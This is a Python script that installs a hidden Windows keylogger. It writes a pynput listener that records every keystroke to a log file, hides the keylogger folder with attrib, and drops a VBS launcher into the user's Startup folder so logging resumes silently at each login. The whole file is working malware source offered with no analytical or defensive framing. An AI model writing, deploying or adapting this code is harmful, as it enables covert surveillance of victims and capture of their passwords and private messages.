import os
import sys
os.system("pip install pynput")
user = os.getlogin() #get user
pwd = f"C:/Users/{user}"
os.chdir(pwd)
os.system("mkdir keylogger")
pwd = f"C:/Users/{user}/keylogger"
os.chdir(pwd)
file_path = fr"'C:/Users/{user}/keylogger/log.txt'"
logger = fr'''from pynput import keyboard
numpad_map = {{
    "<96>":'0',
    "<97>":"1",
    "<98>":"2",
    "<99>":"3",
    "<100>":"4",
    "<101>":"5",
    "<102>":"6",
    "<103>":"7",
    "<104>":"8",
    "<105>":"9"
}}
def on_press(key):
    with open({file_path},'a+') as f:
        try:
            f.write(key.char)  
        except AttributeError as e:
            if key == keyboard.Key.space:
                f.write(" ")
            if key == keyboard.Key.backspace:
                f.write(" "+str(key)+" ")
        except Exception as e:
            if str(key) in numpad_map.keys():
                f.write(numpad_map[str(key)])


if __name__=="__main__":
    with keyboard.Listener(
        on_press=on_press
    ) as l:
        l.join()'''

startup = fr"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
bat = fr'''"{sys.executable}" C:\Users\{user}\keylogger\keylogger.py'''

vbs = fr'''set code = CreateObject("WScript.shell")
code.Run "C:\Users\{user}\keylogger\keylogger.bat",0,False'''



with open("keylogger.py",'w') as f:
    f.write(logger)
with open("keylogger.bat",'w') as f:
    f.write(bat)
os.system("cd .. && attrib +h keylogger")
os.chdir(path=startup)
with open("log.vbs",'w') as f:
    f.write(vbs)

